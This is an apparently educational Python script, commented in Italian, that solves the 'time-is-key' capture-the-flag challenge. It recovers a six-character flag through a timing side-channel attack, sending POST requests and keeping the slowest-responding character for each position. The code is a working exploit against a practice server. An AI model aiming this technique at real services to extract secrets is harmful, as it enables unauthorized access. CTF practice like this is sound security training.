import requests # Libreria per inviare richieste HTTP (GET, POST, ecc.)
import time     # Modulo per misurare il tempo di esecuzione

# URL (Endpoint): L'indirizzo del server vulnerabile a cui inviare la richiesta POST.
URL = "http://time-is-key.challs.olicyber.it/" 
# CHARACTER_SET: L'insieme di tutti i caratteri possibili che potrebbero comporre la flag.
CHARACTER_SET = "0123456789abcdefghijklmnopqrstuvwxyz"
# FLAG_LENGTH: La lunghezza nota della flag (6 caratteri in questo caso).
FLAG_LENGTH = 6
# found_flag: Lista che conterrà i caratteri scoperti. Inizializzata con placeholder 'x'.
found_flag = list("xxxxxx") 

print("Inizio Timing Attack...")

# Ciclo esterno: Itera su ogni posizione della flag, da 0 a 5.
for position in range(FLAG_LENGTH):
    
    # best_time: Variabile che memorizza il tempo di risposta più lungo trovato per la posizione corrente.
    best_time = 0.0
    # correct_char: Memorizza il carattere che ha prodotto il best_time.
    correct_char = ''

    # Ciclo interno: Itera su tutti i possibili caratteri da testare per la posizione corrente.
    for char in CHARACTER_SET:
        
        # Costruisce il payload: Mantiene i caratteri trovati precedentemente (found_flag)
        # e inserisce il carattere attuale (char) nella 'position' in esame.
        test_flag = "".join(found_flag[:position]) + char + "".join(found_flag[position+1:])
        
        # Prepara i dati da inviare con il metodo POST (il server si aspetta la variabile "flag").
        data = {"flag": test_flag}
        
        # Misura il tempo: Registra l'istante prima di inviare la richiesta.
        start_time = time.time()
        
        try:
            # Invia la richiesta POST al server.
            # Il timeout di 10 secondi è una sicurezza per evitare che lo script si blocchi indefinitamente.
            response = requests.post(URL, data=data, timeout=10)
        except requests.exceptions.ReadTimeout:
            # Se la richiesta fallisce per timeout, si assume che il server abbia aspettato a lungo (carattere corretto).
            # L'istante di fine è comunque registrato.
            end_time = time.time()
        else:
            # Se la richiesta ha successo, registra l'istante di fine.
            end_time = time.time()
            
        # Calcola il tempo totale trascorso (latenza di rete + ritardo intenzionale del server).
        elapsed_time = end_time - start_time
        
        # Logica del Timing Attack: 
        # Se il tempo trascorso è maggiore del tempo più lungo trovato finora per questa posizione,
        # si assume che questo carattere sia corretto, poiché il server ha introdotto un ritardo (usleep).
        if elapsed_time > best_time:
            best_time = elapsed_time
            correct_char = char
            
        # Stampa l'avanzamento su una singola riga (grazie a end='\r').
        print(f"  Pos {position} - Test {char}: {elapsed_time:.3f}s", end='\r')

    # Aggiorna la flag: Al termine del ciclo interno, il carattere più lento viene fissato come corretto.
    found_flag[position] = correct_char
    # Stampa il risultato parziale.
    print(f"\n[+] Trovato car. {position}: '{correct_char}' (Tempo: {best_time:.3f}s)")
    print(f"[*] Flag attuale: {''.join(found_flag)}")
    
# Stampa il risultato finale dopo aver trovato tutti i 6 caratteri.
print("\n[🎉] Flag finale: " + "".join(found_flag))